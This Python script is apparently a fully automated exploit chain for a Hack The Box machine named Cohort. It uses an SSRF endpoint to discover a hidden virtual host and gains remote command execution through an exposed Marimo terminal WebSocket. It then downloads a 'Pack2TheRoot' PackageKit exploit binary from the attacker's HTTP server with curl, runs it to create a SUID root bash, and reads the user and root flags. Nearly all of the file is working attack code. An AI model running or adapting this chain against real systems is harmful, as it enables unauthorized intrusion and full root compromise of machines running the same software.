#!/usr/bin/env python3

import argparse
import base64
import http.client
import http.server
import json
import os
import re
import select
import socket
import ssl
import struct
import sys
import threading
import time


# ============================================================
# COHORT HTB - AUTOMATED EXPLOIT CHAIN
#
# Chain:
#
#   SSRF
#     |
#     v
#   Internal /status
#     |
#     v
#   Hidden Marimo vhost
#     |
#     v
#   Marimo WebSocket RCE
#     |
#     v
#   marimo shell
#     |
#     +----> user.txt
#     |
#     v
#   Pack2TheRoot PoC
#     |
#     v
#   SUID bash
#     |
#     v
#   root.txt
#
# Usage:
#
#   User flag:
#       python3 cohort.py 10.129.20.66
#
#   User + root:
#       python3 cohort.py 10.129.20.66 \
#           hon  \
#           --exploit ./exploit.bin
#
# ============================================================


TIMEOUT = 8

PUBLIC_HOST = "cohort.htb"

FALLBACK_VHOST = (
    "nb-1be3782a8afd3ad5.cohort.htb"
)


class Cohort:

    def __init__(self, target, lhost=None, exploit=None):

        self.target = target
        self.lhost = lhost
        self.exploit = exploit

        self.hidden_host = None
        self.marimo_sock = None

    # ========================================================
    # Logging
    # ========================================================

    @staticmethod
    def info(message):
        print(f"[*] {message}")

    @staticmethod
    def good(message):
        print(f"[+] {message}")

    @staticmethod
    def error(message):
        print(f"[-] {message}")

    # ========================================================
    # SSRF
    # ========================================================

    def ssrf(self, url, fmt="json"):

        self.info(f"SSRF -> {url}")

        context = ssl._create_unverified_context()

        connection = http.client.HTTPSConnection(
            self.target,
            443,
            timeout=TIMEOUT,
            context=context
        )

        body = json.dumps({
            "url": url,
            "format": fmt
        })

        headers = {
            "Host": PUBLIC_HOST,
            "Content-Type": "application/json"
        }

        connection.request(
            "POST",
            "/api/validate",
            body=body,
            headers=headers
        )

        response = connection.getresponse()

        data = response.read()

        connection.close()

        return data

    # ========================================================
    # Discover hidden virtual host
    # ========================================================

    def discover_vhost(self):

        self.info(
            "Requesting internal /status through SSRF..."
        )

        data = self.ssrf(
            "http://127.1:/status",
            "json"
        )

        text = data.decode(
            errors="ignore"
        )

        print()
        print("----- /status response -----")
        print(text[:8000])
        print("----------------------------")
        print()

        hosts = re.findall(
            r"[A-Za-z0-9._-]+\.cohort\.htb",
            text,
            re.IGNORECASE
        )

        hosts = [
            host for host in hosts
            if host.lower() != PUBLIC_HOST
        ]

        if hosts:

            self.hidden_host = hosts[0]

            self.good(
                f"Hidden vhost discovered: "
                f"{self.hidden_host}"
            )

            return True

        # Fallback from the supplied write-up.
        if FALLBACK_VHOST.lower() in text.lower():

            self.hidden_host = FALLBACK_VHOST

            self.good(
                f"Hidden vhost discovered: "
                f"{self.hidden_host}"
            )

            return True

        self.error(
            "Could not discover hidden vhost."
        )

        return False

    # ========================================================
    # Receive exact bytes
    # ========================================================

    @staticmethod
    def recv_exact(sock, amount):

        data = b""

        while len(data) < amount:

            chunk = sock.recv(
                amount - len(data)
            )

            if not chunk:
                raise ConnectionError(
                    "Socket closed."
                )

            data += chunk

        return data

    # ========================================================
    # Receive one WebSocket frame
    # ========================================================

    def recv_frame(self, sock):

        header = self.recv_exact(
            sock,
            2
        )

        first = header[0]
        second = header[1]

        fin = bool(first & 0x80)
        opcode = first & 0x0F

        masked = bool(second & 0x80)

        length = second & 0x7F

        # Extended 16-bit length
        if length == 126:

            length = struct.unpack(
                "!H",
                self.recv_exact(sock, 2)
            )[0]

        # Extended 64-bit length
        elif length == 127:

            length = struct.unpack(
                "!Q",
                self.recv_exact(sock, 8)
            )[0]

        mask = b""

        if masked:

            mask = self.recv_exact(
                sock,
                4
            )

        payload = self.recv_exact(
            sock,
            length
        )

        # Server -> client frames normally aren't masked,
        # but support masked frames anyway.
        if masked:

            payload = bytes(
                payload[i] ^
                mask[i % 4]
                for i in range(len(payload))
            )

        return fin, opcode, payload

    # ========================================================
    # Receive available WebSocket data
    # ========================================================

    def recv_frames(self, sock, timeout=5):

        result = bytearray()

        # IMPORTANT:
        #
        # Do not use a blocking recv() indefinitely.
        #
        # select() lets us stop once the server has
        # stopped sending terminal data.

        sock.setblocking(False)

        deadline = time.monotonic() + timeout

        while time.monotonic() < deadline:

            remaining = (
                deadline -
                time.monotonic()
            )

            if remaining <= 0:
                break

            readable, _, _ = select.select(
                [sock],
                [],
                [],
                min(remaining, 0.5)
            )

            if not readable:
                continue

            try:

                fin, opcode, payload = (
                    self.recv_frame(sock)
                )

            except BlockingIOError:
                continue

            except (
                ConnectionResetError,
                BrokenPipeError,
                OSError
            ):
                break

            # ------------------------------------------------
            # CLOSE
            # ------------------------------------------------

            if opcode == 0x8:
                break

            # ------------------------------------------------
            # PING
            # ------------------------------------------------

            if opcode == 0x9:

                self.send_frame(
                    sock,
                    payload,
                    opcode=0xA
                )

                continue

            # ------------------------------------------------
            # PONG
            # ------------------------------------------------

            if opcode == 0xA:
                continue

            # ------------------------------------------------
            # TEXT
            # ------------------------------------------------

            if opcode == 0x1:

                result.extend(
                    payload
                )

                continue

            # ------------------------------------------------
            # BINARY
            # ------------------------------------------------

            if opcode == 0x2:

                result.extend(
                    payload
                )

                continue

            # ------------------------------------------------
            # CONTINUATION
            # ------------------------------------------------

            if opcode == 0x0:

                result.extend(
                    payload
                )

                continue

        return bytes(result)

    # ========================================================
    # Send WebSocket frame
    # ========================================================

    def send_frame(
        self,
        sock,
        payload,
        opcode=0x1
    ):

        if isinstance(payload, str):

            payload = payload.encode()

        first = (
            0x80 |
            opcode
        )

        length = len(payload)

        # ----------------------------------------------------
        # Payload length
        # ----------------------------------------------------

        if length < 126:

            header = bytes([
                first,
                0x80 | length
            ])

        elif length < 65536:

            header = bytes([
                first,
                0x80 | 126
            ])

            header += struct.pack(
                "!H",
                length
            )

        else:

            header = bytes([
                first,
                0x80 | 127
            ])

            header += struct.pack(
                "!Q",
                length
            )

        # Client -> server frames MUST be masked.

        mask = os.urandom(4)

        masked_payload = bytes(
            payload[i] ^
            mask[i % 4]
            for i in range(len(payload))
        )

        sock.sendall(
            header +
            mask +
            masked_payload
        )

    # ========================================================
    # Connect to Marimo terminal WebSocket
    # ========================================================

    def connect_marimo(self):

        if not self.hidden_host:

            raise RuntimeError(
                "Hidden vhost is unknown."
            )

        self.info(
            "Connecting to Marimo at "
            f"https://{self.hidden_host}/terminal/ws"
        )

        # ----------------------------------------------------
        # TCP
        # ----------------------------------------------------

        raw = socket.create_connection(
            (
                self.target,
                443
            ),
            timeout=TIMEOUT
        )

        # ----------------------------------------------------
        # TLS
        # ----------------------------------------------------

        context = ssl.SSLContext(
            ssl.PROTOCOL_TLS_CLIENT
        )

        context.check_hostname = False

        context.verify_mode = (
            ssl.CERT_NONE
        )

        sock = context.wrap_socket(
            raw,
            server_hostname=self.hidden_host
        )

        # ----------------------------------------------------
        # WebSocket key
        # ----------------------------------------------------

        key = base64.b64encode(
            os.urandom(16)
        ).decode()

        # ----------------------------------------------------
        # WebSocket handshake
        # ----------------------------------------------------

        request = (
            "GET /terminal/ws HTTP/1.1\r\n"
            f"Host: {self.hidden_host}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            f"Origin: https://{self.hidden_host}\r\n"
            "\r\n"
        )

        sock.sendall(
            request.encode()
        )

        # ----------------------------------------------------
        # Receive HTTP response
        # ----------------------------------------------------

        response = b""

        sock.settimeout(
            TIMEOUT
        )

        while b"\r\n\r\n" not in response:

            chunk = sock.recv(
                4096
            )

            if not chunk:

                raise ConnectionError(
                    "WebSocket handshake failed."
                )

            response += chunk

        header = response.decode(
            errors="ignore"
        )

        print()
        print(
            "----- WebSocket handshake -----"
        )
        print(
            header.split(
                "\r\n\r\n"
            )[0]
        )
        print(
            "-------------------------------"
        )
        print()

        if "101 Switching Protocols" not in header:

            raise RuntimeError(
                "WebSocket upgrade failed."
            )

        self.marimo_sock = sock

        self.good(
            "Marimo WebSocket connected."
        )

        # ----------------------------------------------------
        # Drain initial terminal frames.
        # ----------------------------------------------------

        initial = self.recv_frames(
            sock,
            timeout=2
        )

        if initial:

            self.info(
                "Received initial terminal data."
            )

            # Don't print the entire initial terminal
            # state unless useful.
            try:

                initial_text = initial.decode(
                    errors="replace"
                )

                if initial_text.strip():

                    print(
                        initial_text,
                        end=""
                    )

            except Exception:
                pass

    # ========================================================
    # Execute shell command
    # ========================================================

    def command(
        self,
        cmd,
        wait=5
    ):

        if not self.marimo_sock:

            raise RuntimeError(
                "Marimo shell is not connected."
            )

        self.info(
            f"CMD: {cmd}"
        )

        # PTY input should be terminated with newline.

        payload = (
            cmd.rstrip("\r\n") +
            "\n"
        )

        self.send_frame(
            self.marimo_sock,
            payload,
            opcode=0x1
        )

        # Allow the command to execute.

        time.sleep(
            0.5
        )

        data = self.recv_frames(
            self.marimo_sock,
            timeout=wait
        )

        text = data.decode(
            errors="replace"
        )

        if text:

            print(
                text,
                end=""
            )

        return text

    # ========================================================
    # Get user flag
    # ========================================================

    def get_user_flag(self):

        self.info(
            "Attempting to read user.txt..."
        )

        output = self.command(
            "cat /home/marimo/user.txt",
            wait=5
        )

        flag = self.extract_flag(
            output
        )

        if flag:

            print()
            self.good(
                f"USER FLAG: {flag}"
            )
            print()

        else:

            self.error(
                "Could not automatically "
                "extract user flag."
            )

        return flag

    # ========================================================
    # HTTP server for exploit binary
    # ========================================================

    def start_http_server(self):

        if not self.exploit:
            return None

        exploit_path = os.path.abspath(
            self.exploit
        )

        if not os.path.isfile(
            exploit_path
        ):

            raise FileNotFoundError(
                f"Exploit not found: "
                f"{exploit_path}"
            )

        directory = os.path.dirname(
            exploit_path
        )

        filename = os.path.basename(
            exploit_path
        )

        # Serve from exploit directory.

        os.chdir(
            directory
        )

        class QuietHandler(
            http.server.SimpleHTTPRequestHandler
        ):

            def log_message(
                self,
                fmt,
                *args
            ):

                print(
                    "[HTTP] " +
                    fmt % args
                )

        server = (
            http.server.ThreadingHTTPServer(
                (
                    "0.0.0.0",
                    8000
                ),
                QuietHandler
            )
        )

        thread = threading.Thread(
            target=server.serve_forever,
            daemon=True
        )

        thread.start()

        self.good(
            "HTTP server listening on "
            "0.0.0.0:8000"
        )

        self.good(
            f"Serving: {filename}"
        )

        return server, filename

    # ========================================================
    # Root exploitation
    # ========================================================

    def root_exploit(self):

        if not self.exploit:

            self.info(
                "No --exploit supplied."
            )

            self.info(
                "Skipping root escalation."
            )

            return None

        if not self.lhost:

            raise ValueError(
                "--lhost is required when "
                "using --exploit."
            )

        server_info = (
            self.start_http_server()
        )

        if not server_info:
            return None

        server, filename = (
            server_info
        )

        remote = "/tmp/exploit.bin"

        # ----------------------------------------------------
        # Download
        # ----------------------------------------------------

        self.good(
            f"Downloading {filename} "
            f"to {remote}"
        )

        self.command(
            f"curl -fsSL "
            f"http://{self.lhost}:8000/"
            f"{filename} "
            f"-o {remote}",
            wait=5
        )

        # ----------------------------------------------------
        # Make executable
        # ----------------------------------------------------

        self.command(
            f"chmod +x {remote}"
        )

        # ----------------------------------------------------
        # Clean previous exploit artifacts
        # ----------------------------------------------------

        self.command(
            "rm -f "
            "/tmp/.suid_bash "
            "/tmp/pk.log"
        )

        # ----------------------------------------------------
        # Start PoC
        # ----------------------------------------------------

        self.good(
            "Starting Pack2TheRoot PoC..."
        )

        self.command(
            "nohup /tmp/exploit.bin "
            ">/tmp/pk.log 2>&1 &",
            wait=3
        )

        self.info(
            "Waiting for PackageKit race..."
        )

        time.sleep(
            12
        )

        # ----------------------------------------------------
        # Check SUID shell
        # ----------------------------------------------------

        output = self.command(
            "ls -la /tmp/.suid_bash",
            wait=3
        )

        print()

        check = self.command(
            "test -u /tmp/.suid_bash "
            "&& echo ROOT_SHELL_CREATED "
            "|| echo ROOT_SHELL_NOT_CREATED",
            wait=3
        )

        if (
            "ROOT_SHELL_CREATED"
            not in check
        ):

            self.error(
                "SUID shell was not created."
            )

            self.info(
                "PackageKit log:"
            )

            self.command(
                "cat /tmp/pk.log",
                wait=3
            )

            return None

        self.good(
            "SUID root shell created."
        )

        # ----------------------------------------------------
        # Root flag
        # ----------------------------------------------------

        output = self.command(
            "/tmp/.suid_bash -p -c "
            "'id; cat /root/root.txt'",
            wait=5
        )

        flag = self.extract_flag(
            output
        )

        if flag:

            print()

            self.good(
                f"ROOT FLAG: {flag}"
            )

            print()

        else:

            self.error(
                "Could not automatically "
                "extract root flag."
            )

        return flag

    # ========================================================
    # Flag extraction
    # ========================================================

    @staticmethod
    def extract_flag(text):

        if not text:
            return None

        # Standard HTB 32-character flag.

        matches = re.findall(
            r"\b[0-9a-fA-F]{32}\b",
            text
        )

        if matches:
            return matches[-1]

        # HTB{...}

        matches = re.findall(
            r"HTB\{[^}\r\n]+\}",
            text
        )

        if matches:
            return matches[-1]

        # Generic flag{...}

        matches = re.findall(
            r"[A-Za-z0-9_-]+\{[^}\r\n]+\}",
            text
        )

        if matches:
            return matches[-1]

        # Last-resort:
        # return a long non-empty line.

        lines = [
            line.strip()
            for line in text.splitlines()
            if line.strip()
        ]

        for line in reversed(lines):

            # Ignore obvious shell output.

            if line in (
                "ROOT_SHELL_CREATED",
                "ROOT_SHELL_NOT_CREATED"
            ):
                continue

            if len(line) >= 20:

                return line

        return None

    # ========================================================
    # Main attack chain
    # ========================================================

    def run(self):

        print()
        print("=" * 60)
        print(
            "          COHORT HTB - AUTOMATION"
        )
        print("=" * 60)
        print()

        print(
            f"Target : {self.target}"
        )

        print(
            "Port   : 443"
        )

        print()

        # ----------------------------------------------------
        # 1. SSRF -> hidden vhost
        # ----------------------------------------------------

        if not self.discover_vhost():

            return False

        # ----------------------------------------------------
        # 2. Marimo WebSocket
        # ----------------------------------------------------

        self.connect_marimo()

        # ----------------------------------------------------
        # 3. Verify shell
        # ----------------------------------------------------

        self.command(
            "id; whoami; hostname",
            wait=5
        )

        # ----------------------------------------------------
        # 4. User flag
        # ----------------------------------------------------

        user_flag = (
            self.get_user_flag()
        )

        # ----------------------------------------------------
        # 5. Root
        # ----------------------------------------------------

        root_flag = (
            self.root_exploit()
        )

        # ----------------------------------------------------
        # Results
        # ----------------------------------------------------

        print()
        print("=" * 60)
        print(
            "                    RESULTS"
        )
        print("=" * 60)

        if user_flag:

            print(
                f"[+] USER : {user_flag}"
            )

        else:

            print(
                "[-] USER : not extracted"
            )

        if root_flag:

            print(
                f"[+] ROOT : {root_flag}"
            )

        else:

            print(
                "[-] ROOT : not extracted"
            )

        print("=" * 60)
        print()

        return bool(
            user_flag or
            root_flag
        )


# ============================================================
# CLI
# ============================================================

def main():

    parser = argparse.ArgumentParser(
        description=(
            "Cohort HTB automated exploit chain"
        )
    )

    parser.add_argument(
        "target",
        help="Target IP"
    )

    parser.add_argument(
        "--lhost",
        help=(
            "Attacker IP used to serve "
            "the Pack2TheRoot binary"
        )
    )

    parser.add_argument(
        "--exploit",
        help=(
            "Path to Pack2TheRoot "
            "exploit binary"
        )
    )

    args = parser.parse_args()

    try:

        exploit = Cohort(
            target=args.target,
            lhost=args.lhost,
            exploit=args.exploit
        )

        success = exploit.run()

        sys.exit(
            0 if success else 1
        )

    except KeyboardInterrupt:

        print(
            "\n[!] Interrupted."
        )

        sys.exit(130)

    except Exception as error:

        print(
            f"\n[-] ERROR: {error}"
        )

        sys.exit(1)


if __name__ == "__main__":

    main()